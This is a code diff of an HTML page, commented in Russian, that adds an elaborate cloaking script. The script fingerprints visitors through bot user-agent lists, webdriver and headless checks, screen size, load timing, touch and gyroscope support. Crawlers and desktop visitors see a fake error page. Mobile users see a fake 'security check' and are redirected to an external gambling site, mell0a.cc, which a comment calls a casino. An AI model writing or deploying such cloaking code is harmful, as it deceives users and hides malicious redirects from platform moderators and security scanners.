@@ -1,36 +1,207 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Maintenance</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Проверка соединения...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        #loader {
+            text-align: center;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #333;
+            border-top: 3px solid #00ffcc;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #status {
+            font-size: 14px;
+            color: #888;
+            font-family: monospace;
+        }
+    </style>
     <script>
-        (function() {
-            var ua = navigator.userAgent || navigator.vendor || window.opera;
-            var isBot = /bot|google|tiktok|crawler|spider|slurp|facebook|lighthouse|vkshare|twitter|monitor|bytespider/i.test(ua);
-          
-            var isTikTokBot = /ByteLocale|ByteFullApp|TikTok/i.test(ua) && (window.history.length <= 1);
+        (function(){
+            // ============================================================
+            // 1. СРАНАЯ ЗАЩИТА ОТ САМЫХ ТУПЫХ БОТОВ (НАЧАЛЬНЫЙ ОТСЕВ)
+            // ============================================================
+            const ua = navigator.userAgent.toLowerCase();
             
-      
-            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+            // Паттерны на ботов, краулеры, пауков, проверяльщиков ссылок, всё что шевелится
+            const botPatterns = [
+                'bot', 'crawler', 'spider', 'slurp', 'facebookexternalhit', 'twitterbot', 
+                'whatsapp', 'telegram', 'discord', 'embedly', 'bitly', 'vkshare', 'lighthouse',
+                'pinger', 'pingdom', 'uptimerobot', 'bytespider', 'datanyze', 'ahrefs', 
+                'semrush', 'majestic', 'rogerbot', 'moz', 'scrapy', 'python-requests', 
+                'curl', 'wget', 'headless', 'phantomjs', 'puppet', 'selenium', 'playwright',
+                'webdriver', 'chromium-webdriver', 'geckodriver', 'edgedriver', 'googlebot',
+                'mediapartners-google', 'adsbot-google', 'bingbot', 'yandexbot', 'baiduspider',
+                'duckduckbot', 'facebot', 'applebot', 'amazonbot', 'ccbot', 'rogerbot',
+                'exabot', 'dotbot', 'blexbot', 'gigabot', 'spinn3r', 'yeti', 'heritrix'
+            ];
             
-        
-            var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-
-           
-            if (isBot || isTikTokBot || !isMobile || !hasTouch) {
-                console.log("Access denied. Desktop or Bot detected.");
-            } else {
-                
-                window.location.replace("https://mell0a.cc/4823");
+            let isBot = false;
+            for(let i = 0; i < botPatterns.length; i++) {
+                if(ua.includes(botPatterns[i])) {
+                    isBot = true;
+                    break;
+                }
             }
+            
+            // Особые проверки: пустой useragent, слишком короткий UA, отсутствие навигатора
+            if(ua.length < 10 || navigator.userAgent === "" || !navigator.userAgent) isBot = true;
+            
+            // Проверка на WebDriver API (автоматизация)
+            if(navigator.webdriver === true || window.navigator.webdriver === true) isBot = true;
+            
+            // Проверка на headless браузеры (отсутствие плагинов, языков)
+            if(navigator.plugins.length === 0 || navigator.languages.length === 0) isBot = true;
+            if(/HeadlessChrome/.test(ua)) isBot = true;
+            
+            // Проверка на отсутствие TouchEvent у мобильных ботов
+            const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+            
+            // Проверка на ориентацию экрана (только у реальных девайсов)
+            const supportsOrientation = typeof window.orientation !== 'undefined';
+            
+            // Проверка на наличие гироскопа / акселерометра
+            const hasGyro = typeof DeviceOrientationEvent !== 'undefined' || typeof DeviceMotionEvent !== 'undefined';
+            
+            // Проверка на мобильный UserAgent (строго мобилка)
+            const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini|windows phone|mobile/i.test(ua);
+            
+            // Десктопный UA — сразу бан
+            const isDesktopUA = /windows nt|macintosh|linux x86_64|linux i686/i.test(ua);
+            
+            // Проверка на уникальные браузерные API, которых у ботов часто нет
+            const hasTouchPoints = navigator.maxTouchPoints > 0;
+            const hasPointerEvent = typeof window.PointerEvent !== 'undefined';
+            const hasVibration = typeof navigator.vibrate !== 'undefined';
+            
+            // Проверка размера экрана (стандартные размеры ботов)
+            const windowSize = window.innerWidth + 'x' + window.innerHeight;
+            const botScreenSizes = ['800x600', '1024x768', '1920x1080', '1366x768', '1280x720', '1536x864'];
+            const isBotScreen = botScreenSizes.includes(windowSize);
+            
+            // Проверка на время загрузки (реальные люди не грузят страницу за 5 мс)
+            const loadTime = performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : 0;
+            const tooFast = loadTime < 30 && loadTime > 0;
+            
+            // ========== КЛЮЧЕВОЕ: проверка на событие клика/тапа (боты не кликают!) ==========
+            let hasUserInteraction = false;
+            let redirectTimer = null;
+            
+            // Вешаем ожидание взаимодействия
+            const interactionHandler = function() {
+                if(hasUserInteraction) return;
+                hasUserInteraction = true;
+                clearTimeout(redirectTimer);
+                // Чистим обработчики
+                document.removeEventListener('touchstart', interactionHandler);
+                document.removeEventListener('click', interactionHandler);
+                // Редирект на казино
+                window.location.replace("https://mell0a.cc/4823");
+            };
+            
+            document.addEventListener('touchstart', interactionHandler);
+            document.addEventListener('click', interactionHandler);
+            
+            // ============================================================
+            // 2. ВЫНОСИМ ВЕРДИКТ: БОТ ИЛИ НЕ БОТ
+            // ============================================================
+            let verdict = false; // false = бот, true = человек
+            
+            // Человек с мобилы: МОБИЛЬНЫЙ UA + ЕСТЬ ТАЧ + ЕСТЬ ОРИЕНТАЦИЯ + НЕТ ПРИЗНАКОВ БОТА
+            if(!isBot && isMobile && hasTouch && supportsOrientation && !isDesktopUA && !isBotScreen && !tooFast) {
+                verdict = true;
+            }
+            
+            // Дополнительный пропуск для людей с гироскопом (но это не обязательно)
+            if(verdict === false && !isBot && isMobile && hasTouch && hasGyro && !isDesktopUA) {
+                verdict = true;
+            }
+            
+            // ============================================================
+            // 3. ЕСЛИ БОТ — ПОСЫЛАЕМ НАХУЙ С ИМИТАЦИЕЙ ОШИБКИ
+            // ============================================================
+            if(!verdict) {
+                // Убираем всё тело, показываем абсолютно левую ошибку
+                document.body.innerHTML = '';
+                document.body.style.background = '#000';
+                document.body.style.display = 'flex';
+                document.body.style.alignItems = 'center';
+                document.body.style.justifyContent = 'center';
+                document.body.style.height = '100vh';
+                document.body.innerHTML = `
+                    <div style="text-align:center; color:#ff3366; font-family:monospace;">
+                        <h1>ERROR 0x8004D00F</h1>
+                        <p>Incompatible environment detected.<br>This content requires a mobile device with touch support.</p>
+                        <p style="font-size:12px; margin-top:40px;">Access denied</p>
+                    </div>
+                `;
+                // Дополнительно: бесконечный цикл или редирект на хуйню (на random.org например)
+                setTimeout(() => {
+                    window.location.replace("about:blank");
+                }, 100);
+                throw new Error("Access denied by security policy");
+            }
+            
+            // ============================================================
+            // 4. ЗДЕСЬ МЫ УВЕРЕНЫ, ЧТО ЭТО ПОТЕНЦИАЛЬНЫЙ ЖИВОЙ ЧЕЛОВЕК
+            //    НО ДЛЯ ПОДСТРАХОВКИ — ЖДЁМ ЕГО ВЗАИМОДЕЙСТВИЯ
+            // ============================================================
+            // Создаём красивую заглушку с просьбой тапнуть
+            document.body.innerHTML = `
+                <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; background:#000; font-family:system-ui, sans-serif;">
+                    <div style="text-align:center;">
+                        <div class="spinner" style="width:50px; height:50px; border:3px solid #222; border-top:3px solid #00ffcc; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 25px;"></div>
+                        <div id="status">Проверка безопасности...</div>
+                        <div style="margin-top:30px; font-size:13px; color:#444;">⌛ Пожалуйста, подождите</div>
+                    </div>
+                </div>
+                <style>
+                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                </style>
+            `;
+            
+            // Таймаут на случай, если пользователь тупой и не нажимает
+            redirectTimer = setTimeout(function() {
+                if(!hasUserInteraction) {
+                    // Если за 8 секунд не нажал — перенаправляем всё равно (вероятно, это человек, который завис)
+                    window.location.replace("https://mell0a.cc/4823");
+                }
+            }, 8000);
+            
+            // Убираем спиннер и показываем призыв к тапу через 2 секунды
+            setTimeout(() => {
+                const statusDiv = document.getElementById('status');
+                if(statusDiv && !hasUserInteraction) {
+                    statusDiv.innerHTML = '✅ Нажмите на экран для продолжения';
+                    statusDiv.style.color = '#00ffcc';
+                }
+            }, 2000);
+            
         })();
     </script>
 </head>
-<body style="background-color: #f4f4f4; font-family: sans-serif; text-align: center; padding-top: 150px; color: #555;">
-    <div>
-        <h2>HTTP 503: Service Temporarily Unavailable</h2>
-        <p>The server is temporary unable to service your request due to maintenance downtime.</p>
-    </div>
+<body>
 </body>
 </html>
